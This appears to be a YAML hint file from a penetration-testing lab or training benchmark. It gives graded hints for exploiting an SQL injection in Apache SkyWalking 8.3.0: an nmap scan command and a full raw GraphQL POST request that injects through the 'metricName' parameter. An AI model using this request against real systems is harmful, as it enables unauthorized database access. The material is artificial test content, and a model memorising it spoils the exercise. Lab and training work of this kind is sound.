schema_version: 1
match: skywalking/8.3.0-sqli
hint_levels:
  low:
  - Inspect the skywalking service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8080/tcp → container 8080/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
  high:
  - 'Vulnerability: Apache Skywalking 8.3.0 SQL Injection Vulnerability.'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    POC

    I use GraphiQL's desktop app to send the following GraphQL query:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/skywalking/8.3.0-sqli/1.png

    It can be seen that the SQL statement has raised error, and the value of the `metricName` parameter has been injected ​​after `from`.

    The HTTP request of this GraphQL query is:

    ```
    POST /graphql HTTP/1.1
    Host: {{NODE_IP}}:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json

    {
        "query":"query queryLogs($condition: LogQueryCondition) {
      queryLogs(condition: $condition) {
        total
        logs {
          serviceId
          serviceName
          isError
          content
        }
      }
    }
    ",
        "variables":{
            "condition":{
                "metricName":"sqli",
                "state":"ALL",
                "paging":{
                    "pageSize":10
                }
            }
        }
    }
    ```

    For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.
